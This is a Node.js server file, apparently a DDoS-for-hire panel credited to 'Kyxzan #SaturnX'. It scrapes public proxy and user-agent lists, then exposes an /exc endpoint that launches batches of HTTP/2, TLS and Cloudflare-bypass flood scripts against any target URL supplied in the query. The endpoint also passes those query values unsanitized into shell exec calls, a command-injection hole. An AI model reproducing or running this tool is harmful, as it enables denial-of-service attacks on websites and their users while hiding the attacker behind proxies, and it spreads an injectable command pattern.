const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
const net = require("net"); 

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt", 
  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt", 
  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt", 
  "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/countries/US/data.txt", 
  "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt", 
  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();

        // 🔹 Regex untuk tangkap semua format proxy
        const proxies = data.match(/((socks4|socks5|http|https):\/\/)?(\d{1,3}\.){3}\d{1,3}:\d{2,5}/g);

        if (proxies && proxies.length > 0) {
          // 🔹 Tambahkan prefix http:// kalau tidak ada
          const formatted = proxies.map(p => {
            if (!p.includes("://")) return "http://" + p.trim();
            return p.trim();
          });

          allData += formatted.join("\n") + "\n";
          console.log(`✅ ${formatted.length} proxy ditemukan dari ${url}`);
        } else {
          console.log(`⚠️ Tidak ada proxy valid di ${url}`);
        }

      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    // 🔹 Hapus duplikat dan baris kosong
    const unique = [...new Set(allData.split("\n").map(p => p.trim()).filter(Boolean))];

    // 🔹 Simpan ke file proxy.txt
    fs.writeFileSync("proxy.txt", unique.join("\n"), "utf-8");

    console.log(`✅ Semua proxy berhasil disimpan ke proxy.txt (${unique.length} total)`);

  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

// 🔧 Fungsi cek proxy aktif
async function checkProxyAlive(proxy) {
  return new Promise(resolve => {
    try {
      const match = proxy.match(/^(socks4|socks5|http|https):\/\/([^:]+):(\d+)/i);
      if (!match) return resolve(false);

      const host = match[2];
      const port = parseInt(match[3]);

      const socket = new net.Socket();
      let isAlive = false;

      socket.setTimeout(3000);
      socket.on("connect", () => {
        isAlive = true;
        socket.destroy();
      });
      socket.on("timeout", () => socket.destroy());
      socket.on("error", () => {});
      socket.on("close", () => resolve(isAlive));

      socket.connect(port, host);
    } catch {
      resolve(false);
    }
  });
}

async function scrapeUserAgent() {
  try {
    // 🔹 Daftar URL sumber User-Agent
    const uaUrls = [
      "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt",
      "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-android.txt ",
      "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-desktop.txt",
      "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-ios.txt",
      "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/main/useragents-macos.txt"
    ];

    let allData = "";

    for (const url of uaUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();

        // Pisahkan tiap baris, bersihkan kosong
        const uas = data.split("\n").map(x => x.trim()).filter(Boolean);

        if (uas.length > 0) {
          allData += uas.join("\n") + "\n";
          console.log(`✅ ${uas.length} user-agent ditemukan dari ${url}`);
        } else {
          console.log(`⚠️ Tidak ada user-agent valid di ${url}`);
        }

      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    // 🔹 Hapus duplikat & baris kosong
    const uniqueUA = [...new Set(allData.split("\n").map(u => u.trim()).filter(Boolean))];

    // Simpan hasil
    fs.writeFileSync('ua.txt', uniqueUA.join("\n"), 'utf-8');
    console.log(`✅ Semua user-agent berhasil disimpan ke ua.txt (${uniqueUA.length} total)`);

  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log(`✅ Copy : http://${data.ip}:${port}`);
    return data;
  } catch (error) {
    console.error("❌ Gagal fetch data:", error.message);
  }
}

app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;
console.log(`🔥 EXECUTE: Target = ${target}, Time = ${time}s, Methods = ${methods}`);

  res.status(200).json({
    message: 'API request received. Executing script shortly, By Kyxzan #SaturnX',
    target,
    time,
    methods
  });

  if (methods === 'PLONTE') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/fire.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/h2-fast.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'SATURNDOWN') {
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/tls.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'R2') {
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'PSHT') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'DUAR') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP-RAW.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'bypass-cf') {
    exec(`node ./methods/novaria.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/CFbypass.js ${target} ${time}`);
    exec(`node ./methods/bypassv1 ${target} proxy.txt ${time} 100 10`);
    exec(`node ./methods/hyper.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/TLS-LOST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/tlsvip.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
